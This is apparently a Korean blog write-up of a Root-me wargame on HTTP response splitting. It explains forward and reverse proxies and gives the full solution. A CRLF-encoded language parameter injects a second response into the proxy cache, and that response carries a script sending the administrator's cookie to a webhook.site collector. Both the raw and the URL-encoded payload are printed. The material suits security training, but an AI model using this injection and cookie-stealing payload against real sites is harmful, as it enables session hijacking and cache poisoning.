---
title : HTTP Response Splitting (풀이 봄)
categories : [Wargame, Root-me]
tags : [HTTP Response Splitting]
---

## HTTP Response Splitting
```
Old vulnerability... but powerful !
Author
Arod,  7 November 2013

Statement
A new website is under construction. 
A reverse proxy cache has been implemented in front of the web server and developers
think they have a good security.

Show them they’re wrong by bringing us an administrator access !

The website is still in development and the administrator often logs in.

Note: this is an IPv4 only challenge (for now)
```

## Forward Proxy / Reverse Proxy
```
Forward Proxy

클라이언트가 example.com 에 연결하려하면 사용자 PC가 직접 연결하는게 아니라 포워드 프록시
서버가 요청을 받아서 example.com에 연결하여 그 결과를 클라이언트에 전달(forward)해준다.

포워드 프록시는 대개 캐슁 기능이 있으므로 자주 사용되는 컨텐츠라면 월등한 성능 향상을
가져올 수 있으며 정해진 사이트만 연결하게 설정하는 등 웹 사용 환경을 제한할수 있으므로 기업
환경등에서 많이 사용한다.
```
<img src="https://www.lesstif.com/system-admin/files/21430345/21561365/1/1405440454000/image2014-7-16+0%3A54%3A40.png">

```
Reverse Proxy

클라이언트가 example.com 웹 서비스에 데이타를 요청하면 Reverse Proxy는 이 요청을 받아서
내부 서버에서 데이타를 받은후에 이 데이타를 클라이언트에 전달하게 된다.

내부 서버가 직접 서비스를 제공해도 되지만 이렇게 구성하는 이유중 하나는 보안때문이다.

보통 기업의 네트워크 환경은 DMZ 라고 하는 내부 네트워크와 외부 네트워크 사이에 위치하는
구간이 존재하며 이 구간에는 메일 서버, 웹 서버, FTP 서버등 외부 서비스를 제공하는 서버가
위치하게 된다.
```
<img src="https://www.lesstif.com/system-admin/files/21430345/21561366/1/1405440454000/image2014-7-16+0%3A58%3A45.png">

출처 : <a href="https://www.lesstif.com/system-admin/forward-proxy-reverse-proxy-21430345.html" target="_blank">https://www.lesstif.com/system-admin/forward-proxy-reverse-proxy-21430345.html</a>

## Solution
처음에 언어 선택하는 화면에서 언어를 선택하면 ```/user/param?lang=en```로 값을 주고 ```/home```으로 가게 됨.  
파라미터가 전달되는 언어 선택 창에서 공격을 실시.   
/user/param?lang=en에서 Response Header은 다음과 같음.  
```
HTTP/1.1 302 Found
Set-Cookie: lang=en; Expires=Mon, 06 Jul 2020 11:20:57 GMT; Path=/
Server: WorldCompanyWebServer
Connection: close
Location: /home
Date: Mon, 29 Jun 2020 11:20:57 GMT
Content-Type: text/html
Content-Length: 0
```  
문제에선 admin_cookie 값을 뽑아와야 되므로 XSS 공격문을 넣어줘야함.  
```
HTTP/1.1 302 Found
Set-Cookie: lang=en; Expires=Mon, 06 Jul 2020 11:20:57 GMT; Path=/
Server: WorldCompanyWebServer
Connection: close
Location: /home
Date: Mon, 29 Jun 2020 11:20:57 GMT
Content-Type: text/html
Content-Length: 0

--------추가한 부분---------
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
X-XSS-Protection: 0
Last-Modified: Mon, 21 Oct 2020 07:28:00 GMT 
Content-Length: 140

<html><script>location.href="webhook.site.url?cookie="+document.cookie</script></html>
```
파라미터에 넣은 공격문
```
/user/param?lang=en%0D%0AContent-Length%3A%200%0D%0A%0D%0AHTTP%2F1.1%20200%20OK%0D%0AContent-Type%3A%20text%2Fhtml%0D%0AX-XSS-Protection%3A%200%0D%0ALast-Modified%3A%20Mon%2C%2019%20Oct%202020%2007%3A28%3A00%20GMT%0D%0AContent-Length%3A%20140%0D%0A%0D%0A%3Chtml%3E%3Cscript%3Elocation.href%3D%22https%3A%2F%2Fwebhook.site%2F224721a3-5f0f-4669-a0b1-aa8a1d6f9438%3Fcookie%3D%22%2Bdocument.cookie%3C%2Fscript%3E%3C%2Fhtml%3E%0D%0A
```





